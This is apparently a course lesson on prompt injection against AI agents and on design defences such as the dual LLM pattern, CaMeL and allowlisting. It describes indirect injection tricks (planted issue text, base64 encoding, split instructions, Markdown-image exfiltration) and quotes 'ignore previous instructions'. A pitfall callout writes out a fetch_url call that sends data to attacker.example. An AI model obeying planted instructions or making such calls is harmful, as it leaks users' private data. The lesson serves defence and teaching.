## One channel for instructions and data

Every attack in this lesson comes from one fact: a language model receives your instructions and the data it works on as one sequence of tokens. There is no reliable, built-in boundary between "this is what you should do" and "this is what you should read." Web developers solved the equivalent problem for databases with parameterized queries, which keep code and data in separate channels. Nothing comparable exists for natural language, which is why Simon Willison, who coined the term "prompt injection" in 2022, has written about it for years as an unsolved problem (his series is linked in the sources).

**Direct prompt injection** is the familiar case: the person typing into the system tries to override its instructions. **Indirect prompt injection**, named in Greshake and colleagues' 2023 paper "Not what you've signed up for," is the one that matters for agents: an attacker plants instructions in content the system is likely to retrieve, and never talks to your system at all. The paper demonstrated it against real products, and catalogued the consequences: data theft, spreading to other users, and manipulated information. Google's security team describes the same split, with indirect injections hidden in emails, documents, or calendar invites that instruct the AI to exfiltrate data or take rogue actions.

For the agent you'll build in this studio, list the channels concretely. Issue titles and bodies (anyone who can file an issue), comments, linked web pages, files in a repository, tool results from any MCP server, and even the names of labels or users. Each one is text an outsider may control, and each one lands in the same context as your system prompt.
</Listen>

## The lethal trifecta, applied to an agent

You met Willison's **lethal trifecta** in Studio 1. An agent that has all three of these can be tricked into stealing data: **access to private data**, **exposure to untrusted content**, and **a way to communicate externally**. The attacker uses the second to instruct the agent to read the first and send it through the third.

Agents tend to collect all three without anyone deciding to. A status-report agent reads issues (untrusted), reads internal notes or account data to judge priority (private), and posts updates or fetches links (outbound). Each tool was added for a good reason. Together they are the trifecta.

The practical value of the framing is that it tells you where to cut. You don't have to make the model unfoolable; you have to make sure that, at any moment, the three are not all live at once. Options, from strongest to weakest:

- **Remove a leg.** Drop the outbound tools, or keep private data out of this agent and give it to a different one.
- **Separate legs in time or in components.** Read untrusted content in a step that has no private data and no outbound tools, and pass forward only constrained results (a list of issue numbers, a structured summary), never free text that could carry instructions.
- **Gate the leg that remains.** Once untrusted content and private data have both entered the context, every outbound action needs a deterministic check, and possibly a human.

Watch the subtle outbound channels. A URL in a fetch is outbound, because the query string carries data to whoever runs that server. A Markdown image in a chat message is outbound the moment a client renders it, because rendering requests the image URL; Google lists Markdown sanitization and suspicious-URL redaction among its defenses for this reason. A link the user clicks, an email draft, a PR description: all of them can carry data out.
</Listen>

<Callout type="pitfall" title="Treating 'read-only' as safe">
A tool that only reads can still be the exfiltration leg. `fetch_url("https://attacker.example/?d=...")` reads a page and, in doing so, sends the attacker whatever is in the query string. Classify tools by where data can go, not by whether they change your systems. In your tool table from lesson 10, add a column: can this call send data to a destination someone else chooses?
</Callout>

## Why filters alone fail

The first instinct is to detect the attack: a classifier on incoming content, a regex for "ignore previous instructions," a second model asked "is this an injection?" These help, and vendors use them. Anthropic scans untrusted content entering the context with classifiers, Google describes purpose-built detection models for Gemini in Workspace, and OpenAI's agent guide recommends input guardrails. But all three vendors present them as one layer, not as the defense, and the reasons are worth stating precisely.

First, **detectors are probabilistic, and you face volume.** Anthropic's November 2025 research on browser agents reported reducing attack success to about 1% with its newest model and safeguards, and said plainly that 1% still represents meaningful risk and that no browser agent is immune. A small miss rate times every document your agent reads is a steady stream of misses.

Second, **attackers adapt.** Benchmark rates are measured against known attacks. Anthropic's May 2026 containment post reports that, on one red-teaming benchmark, a recent Claude model held attack success to roughly 0.1% on a single attempt and around 5 to 6% after 100 adaptive attempts. The attacker gets to retry; you have to win every time.

Third, **detection judges content, and content can be disguised.** Encode the data in base64, split an instruction across two issues, phrase it as a policy notice from an admin. A content filter sees text; it cannot see that the recipient address came from an untrusted issue.

The conclusion is not that model-level robustness is worthless. It is valuable, it improves with each model generation, and it differs between models, which makes it a legitimate input to model selection (measure it on your own injection suite, as in this week's lab). The conclusion is that robustness lowers how often the agent tries something bad, while only design limits what happens when it does.
</Listen>

## Defense by design: the dual LLM pattern

If you can't stop the model from being fooled, arrange things so a fooled model has nothing dangerous to do. Willison's **dual LLM pattern** (April 2023) is the first well-known design of this kind. A **privileged LLM** receives only trusted input (the user's request) and has the tools. A **quarantined LLM** handles untrusted content and has no tools. A plain controller program sits between them. When the privileged model needs an email summarized, it never sees the email: the controller fetches it, hands it to the quarantined model, and stores the result in a variable such as `$VAR1`. The privileged model can ask for `$VAR1` to be shown to the user or passed to a tool, but it never reads its contents, so instructions inside it can't steer the privileged model.

Willison was candid about the costs in the same post. It is awkward to build, it limits what the assistant can do, users can still be socially engineered by what the quarantined model produces, and he argued that asking users to approve everything would fail because of dialog fatigue. There is also a hole that later work fixed: even if the privileged model never reads `$VAR1`, untrusted content can still influence *which* data flows *where*, for example if the recipient of an email is itself extracted from untrusted text.
</Listen>

## CaMeL: control flow and data flow

Google DeepMind's **CaMeL** ("Defeating Prompt Injections by Design," Debenedetti and colleagues, 2025) builds on the dual LLM pattern and closes that hole. It makes two separations.

**Control flow** comes only from the trusted query. The privileged model turns the user's request into a small program in a restricted Python-like language. The program fixes which tools run and in what order before any untrusted data is read. Untrusted data, parsed by the quarantined model into structured values, can fill in arguments but cannot add, remove, or reorder steps.

**Data flow** is tracked with **capabilities**: metadata attached to every value recording where it came from and who is allowed to read it. When values are combined, their capabilities combine too. Before each tool call, a custom interpreter checks the arguments' capabilities against security policies. A policy for sending email might say: the recipient must not come from untrusted content, unless it is in the user's contacts, and every recipient must be an allowed reader of the body. If a policy fails, the call is blocked or the user is asked.

The paper reports that, on the AgentDojo benchmark, CaMeL solved 77% of tasks with provable security, compared with 84% for an undefended system. That gap is the honest price of the design, and the paper is open about others: someone has to write and maintain the policies, and asking users to confirm policy violations brings back the fatigue problem. Willison's commentary adds that its strength is that it doesn't rely on more AI to catch AI; the guarantees come from the interpreter, which is ordinary code. You'll build a small version of that check below.
</Listen>

## A catalog of patterns, and the trade they all make

A June 2025 paper by Beurer-Kellner and colleagues, with authors from several labs and companies, generalizes this into six **design patterns** for agents with resistance to prompt injection. In brief, in this course's words:

- **Action-selector:** the model only picks from a fixed menu of actions and never sees tool output; like a smart router.
- **Plan-then-execute:** the plan is fixed before untrusted data is read, so data can't add new actions (though it can still affect arguments).
- **LLM map-reduce:** each untrusted item is processed by an isolated sub-agent that returns a constrained result (a boolean, a number, a fixed-schema record), and only those results are combined.
- **Dual LLM:** privileged and quarantined models with symbolic variables, as above.
- **Code-then-execute:** the CaMeL approach, a program written from the trusted query and run by an interpreter that enforces policies.
- **Context minimization:** remove untrusted or unnecessary content (including the user's original prompt, when it might carry an injection) before later steps.

Willison's summary of the paper highlights its framing: these patterns deliberately limit what agents can do, and the authors doubt that general-purpose agents can offer reliable safety guarantees with current models. Every pattern trades flexibility for a property you can reason about.

For the project agent, two patterns fit naturally. **Map-reduce** for reading issues: a cheap model turns each issue into a fixed-schema record (status, owner, blocked or not, a short summary with no URLs), and only the records reach the step that writes the report. **Plan-then-execute** for actions: the set of actions is fixed by your code (draft a report, request approval, post to one channel), and nothing in an issue can add "email someone." Note the model-selection angle: the per-issue step is high volume and low judgment, which suits a small, inexpensive model, and its constrained output is what makes that safe.
</Listen>

<Callout type="claim" title="Prompt injection will not be solved at the model layer soon (several sources, 2025 to 2026)">
**The claim:** Beurer-Kellner and colleagues (June 2025) doubt general-purpose agents can give reliable safety guarantees with current models; Anthropic (November 2025) says no browser agent is immune; Anthropic's containment post (May 2026) says model-layer protection will never be 100% effective. **Evidence for:** measured attack success stays above zero even for the best-defended systems, and rises under adaptive attack. **Evidence against, or limits:** robustness has improved substantially across model generations, and for narrow tasks some design patterns give strong guarantees. **What to do:** plan as if injection will sometimes succeed, and design so that success is boring.
</Callout>

## Practical mitigations, layered

Most teams will not build a CaMeL interpreter this quarter. Here is a defensible stack for a real agent, roughly in order of how much protection each layer buys.

1. **Break or gate the trifecta.** Decide which leg this agent does not get. If it needs all three, gate outbound actions once untrusted content and private data have both entered the context.
2. **Allowlist destinations.** Hosts, email domains, channels. A non-allowlisted destination is a deterministic deny. This is the control that survives encoding tricks.
3. **Track data flow.** At minimum, session-level taint (has untrusted content been read? has private data?). Better, value-level provenance as in the exercise. Block private data in outbound arguments.
4. **Constrain the interfaces.** Pass structured outputs between steps (enums, fixed fields, no free-form URLs), as OpenAI's agent-safety guide recommends; strip or redact links and images in anything rendered.
5. **Keep untrusted text out of privileged positions.** Never in the system or developer prompt; in tool results, labeled as data, as Anthropic's and OpenAI's guides both say.
6. **Use the model layer.** A robust model, clear instructions that tool content is data, and an optional screening classifier. These lower the rate.
7. **Approve the rest, rarely and with exact arguments.**
8. **Test it adversarially.** Keep an injection suite of fixture documents, run it on every change, and report two numbers together: attack success rate and task success on benign inputs. AgentDojo (Debenedetti and colleagues, 2024) measures exactly this pair, with 97 tasks and 629 security test cases, and found that both attacks and defenses leave a lot unsolved.

None of these is sufficient alone, and you do not need all of them for every agent. Match the stack to the blast radius from lesson 10.
</Listen>

<GoDeeper title="MCP adds its own injection surfaces">
When tools come from MCP servers, the server's tool descriptions and results are also content you did not write. A server can change its tool descriptions after you approved it, and a trusted server can still return untrusted data (Anthropic's containment post gives the example of a GitHub connector loading a poisoned README). The MCP specification's security best practices page covers protocol-level attacks such as the confused deputy problem and token passthrough. Treat every MCP server as a source of untrusted content unless you control both the server and everything it reads, and pin or review tool descriptions as part of your release process.
</GoDeeper>
